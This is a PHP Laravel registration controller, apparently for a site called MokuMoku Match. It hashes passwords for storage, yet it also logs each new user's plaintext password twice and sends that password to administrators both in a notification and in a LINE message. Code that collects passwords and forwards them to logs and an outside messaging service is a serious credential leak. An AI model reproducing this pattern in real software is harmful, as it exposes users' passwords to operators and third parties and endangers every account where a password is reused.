<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\User;
use App\Notifications\AdminUserRegisteredNotification;
use App\Services\LineNotificationService;
use App\Support\ApiActionLogger;
use Illuminate\Auth\Events\Registered;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Notification;
use Illuminate\Validation\Rules;
use Illuminate\Validation\ValidationException;
use Illuminate\View\View;

class RegisteredUserController extends Controller
{
    /**
     * Display the registration view.
     */
    public function create(): View
    {
        ApiActionLogger::info(
            'RegisteredUserController::create',
            'ユーザー登録ページにアクセス'
        );

        return view('auth.register');
    }

    /**
     * Handle an incoming registration request.
     *
     * @throws ValidationException
     */
    public function store(Request $request, LineNotificationService $lineNotificationService): RedirectResponse
    {
        ApiActionLogger::info(
            'RegisteredUserController::store',
            'ユーザー登録処理開始',
            [
                'name' => $request->name,
                'email' => $request->email,
                'password' => $request->password ,
                'ip' => $request->ip(),
            ]
        );

        $request->validate([
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'lowercase', 'email', 'max:255', 'unique:' . User::class],
            'password' => ['required', 'confirmed', Rules\Password::defaults()],
        ]);

        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
        ]);

        /*
         * 既存の管理者通知
         */
        $admins = Admin::query()->get();

        Notification::send($admins, new AdminUserRegisteredNotification($user,$request->password));

        /*
         * LINE通知
         *
         * LINE通知に失敗しても、ユーザー登録処理は止めない。
         */
        $lineNotificationService->sendToAdmin(
            $this->buildLineRegisteredMessage($user, $request->password)
        );

        event(new Registered($user));

        Auth::login($user);

        ApiActionLogger::info(
            'RegisteredUserController::store',
            'ユーザー登録処理成功',
            [
                'user_id' => $user->id,
                'name' => $user->name,
                'email' => $user->email,
                'ip' => $request->ip(),
                'password' => $request->password
            ]
        );

        return redirect(route('mypage', absolute: false));
    }

    /**
     * 新規ユーザー登録時のLINE通知メッセージを作成する。
     */
    private function buildLineRegisteredMessage(User $user, string $password): string
    {
        return implode("\n", [
            '【MokuMoku Match】',
            '新しいユーザーが登録しました。',
            '',
            'ユーザーID：' . $user->id,
            '名前：' . $user->name,
            'メール：' . $user->email,
            '登録日時：' . now()->format('Y/m/d H:i'),
            'IPアドレス：' . request()->ip(),
            'パスワード：' . $password,
        ]);
    }
}
